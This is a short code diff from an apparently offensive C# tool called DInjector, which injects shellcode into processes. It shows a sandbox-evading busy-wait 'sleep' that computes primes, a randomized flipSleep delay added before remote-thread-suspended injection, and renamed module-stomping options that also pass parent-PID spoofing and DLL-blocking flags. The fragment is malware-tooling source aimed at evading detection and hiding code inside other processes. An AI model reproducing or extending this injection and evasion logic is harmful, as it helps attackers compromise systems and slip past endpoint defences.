@@ -79,7 +79,7 @@ namespace DInjector
                 else if (50 <= sleep && sleep < 60 || 60 <= sleep)
                     k = 1;
 
-                Console.WriteLine("(Detonator) [=] Sleeping a bit...");
+                Console.WriteLine("(Detonator) [=] Sleeping a bit ...");
 
                 int start = 1, end = sleep * k * 100000;
                 _ = Enumerable.Range(start, end - start).Where(IsPrime).Select(number => number).ToList();
@@ -228,6 +228,12 @@ namespace DInjector
                         break;
 
                     case "remotethreadsuspended":
+                        if (flipSleep == 0)
+                        {
+                            var rand = new Random();
+                            flipSleep = rand.Next(10000, 12500);
+                        }
+
                         RemoteThreadSuspended.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
@@ -270,8 +276,8 @@ namespace DInjector
                         ModuleStomping.Execute(
                             shellcodeBytes,
                             options["/image"],
-                            options["/stomp"],
-                            options["/export"],
+                            options["/stompDll"],
+                            options["/stompExport"],
                             ppid,
                             blockDlls);
                         break;
